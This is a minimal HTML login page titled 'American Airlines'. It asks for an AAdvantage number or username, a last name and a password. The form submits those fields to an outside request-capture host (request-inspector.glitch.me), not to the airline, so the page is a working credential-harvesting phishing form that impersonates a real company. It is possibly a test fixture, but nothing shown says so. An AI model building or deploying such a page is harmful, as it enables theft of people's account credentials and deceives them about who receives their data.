<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>American Airlines</title>
</head>
<body>
<form method="POST" action="https://request-inspector.glitch.me/">
    <label for="username">AAdvantage # or username</label>
    <input id="username" name="username" type="text">
    <br>
    <label for="lastName">Last Name</label>
    <input id="lastName" name="lastName" type="text">
    <br>
    <label for="password">Password</label>
    <input id="password" name="password" type="password">
    <br>
    <input name="remember_me" value="true" type="checkbox">Remember Me
    <button type="submit">Login</button>

    <input type="radio" name="trip" value="round">
    <input type="radio" name="trip" value="one">
</form>

</body>
</html>
